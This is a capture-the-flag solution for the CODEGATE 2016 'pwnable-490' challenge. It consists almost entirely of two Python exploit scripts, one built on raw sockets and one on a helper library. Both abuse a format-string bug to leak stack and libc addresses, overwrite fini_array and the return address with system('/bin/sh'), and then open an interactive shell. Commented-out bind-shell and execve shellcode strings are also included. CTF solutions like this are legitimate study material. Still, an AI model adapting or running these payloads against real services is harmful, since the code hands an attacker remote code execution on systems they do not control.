# CODEGATE 2016 PWNABLE-490

## before using library.

```
import socket
import struct
import telnetlib

#-------------------------------------------------------------#

def shell(s):
	t = telnetlib.Telnet()
	t.sock = s
	print "4ll y0u n33d i5 5HELL!"
	t.interact()

def read_until(f, delim='\n'):
	data = ''
  	while not data.endswith(delim):
    		data += f.read(1)
  	return data

def p32(a): return struct.pack("<I",a)
def u32(a): return struct.unpack("<I", a)[0]
def p64(a): return struct.pack("<Q", a)
def u64(a): return struct.unpack("<Q", a)[0]

HOST = 'localhost'
PORT = 17171

# http://shell-storm.org/shellcode/files/shellcode-882.php
# Shell Bind TCP Shellcode Port 1337
#shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

#http://shell-storm.org/shellcode/files/shellcode-827.php
#Linux/x86 execve /bin/sh shellcode 23 bytes    
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
f = s.makefile("rw", bufsize=0)
#-------------------------------------------------------------#

"""
1st address leak and overwrite fini_array to main()
2nd ret-addr overwrite
"""

addr_dest = 0x080496dc
addr_main = 0x0804849b

offset_system = 0x003ad80
offset_binsh = 0x15ba3f
offset_libc_start = 0x18540

lsb = ( addr_main & 0x0000FFFF ) >> 0
msb = ( addr_main & 0xFFFF0000 ) >> 16


payload  = ''
payload += p32(addr_dest)
payload += p32(addr_dest + 2)
payload += '%264$08x' #stack addr
payload += '%267$08x' #libc addr
payload += '%' + str( lsb - len(payload) ) + 'x'
payload += '%7$hn'
payload += '%' + str( 0x10000 + msb - lsb ) + 'x'
payload += '%8$hn'
payload += '\n'

print '[*]Sending payload...'
print payload

f.write(payload)
read_until(f, "RESPONSE :")
s.recv(8)
leak_stack = int(s.recv(8), 16)
leak_libc = int(s.recv(8), 16)
s.recv(1024)

libc_base =  leak_libc - offset_libc_start - 247
libc_system = libc_base + offset_system
libc_binsh = libc_base + offset_binsh
addr_ret = leak_stack - 0xe4

print "[*] libc-system: 0x%08x" % libc_system
print "[*] libc-binsh : 0x%08x" % libc_binsh
print "[*] return-addr: 0x%08x" % addr_ret

system_lsb = ( libc_system & 0x0000FFFF ) >> 0
system_msb = ( libc_system & 0xFFFF0000 ) >> 16
binsh_lsb = ( libc_binsh & 0x0000FFFF ) >> 0
binsh_msb = ( libc_binsh & 0xFFFF0000 ) >> 16


"""
print hex(system_lsb) #ret-addr		0x9d80 -> 1
print hex(system_msb) #ret-addr + 2 	0xf7e3 -> 3 
print hex(binsh_lsb)  #ret-addr + 8	0xaa3f -> 2
print hex(binsh_msb)  #ret-addr + 10	0xf7f5 -> 4
"""

payload  = p32(addr_ret) 
payload += p32(addr_ret + 8) 
payload += p32(addr_ret + 2) 
payload += p32(addr_ret + 10)      
payload += '%' + str( system_lsb - len(payload) ) + 'x'
payload += '%7$hn'
payload += '%' + str( binsh_lsb - system_lsb ) + 'x'
payload += '%8$hn'
payload += '%' + str( system_msb - binsh_lsb ) + 'x'
payload += '%9$hn'
payload += '%' + str( binsh_msb - system_msb ) + 'x'
payload += '%10$hn'
payload += '\n'

print '[*]Sending payload...'
print payload

f.write(payload)
f.write("echo PWNED\n")
read_until(f, "PWNED")
f.write("ls -lia\n")
shell(s)
```
## after using library

```
from No___Op import *

target = "localhost:17171"

tube = Pwning( target )

"""
1st address leak and overwrite fini_array to main()
2nd ret-addr overwrite
"""

addr_dest = 0x080496dc
addr_main = 0x0804849b

offset_system = 0x003ad80
offset_binsh = 0x15ba3f
offset_libc_start = 0x18540

leak  = '%264$08x' #stack addr
leak += '%267$08x' #libc addr
fsb = FSB(7, header=leak)
fsb.rewrite( addr_dest, addr_main )

payload  = fsb.get()

print "[*]Sending payload..."
print payload
tube.sendline(payload)
tube.read_until("RESPONSE :")
leak_stack = int(tube.recv(8), 16) - 0xe4
leak_libc = int(tube.recv(8), 16) - 247 # __libc_start_main

libc_base = leak_libc - offset_libc_start
libc_system = libc_base + offset_system
libc_binsh = libc_base + offset_binsh

print "libc-base	: %08x" % libc_base
print "libc-system	: %08x" % libc_system
print "libc-binsh	: %08x" % libc_binsh

fsb = FSB(7)
fsb.rewrite( leak_stack, libc_system )
fsb.rewrite( leak_stack + 8, libc_binsh )

payload = fsb.get()

print "[*]Sending payload..."
print payload
tube.sendline(payload)
tube.shell()
```
